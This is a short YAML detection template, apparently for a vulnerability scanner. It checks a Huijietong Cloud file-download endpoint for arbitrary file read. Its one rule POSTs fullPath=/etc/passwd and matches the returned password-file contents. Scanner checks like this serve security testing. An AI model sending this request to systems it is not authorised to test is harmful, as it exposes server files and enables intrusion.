id: huijietong-cloud-fileread

info:
    name: Huijietong Cloud File Read
    author: zan8in
    severity: high

rules:
    r0:
        request:
            cache: true
            method: POST
            path: /fileDownload?action=downloadBackupFile
            body: fullPath=/etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()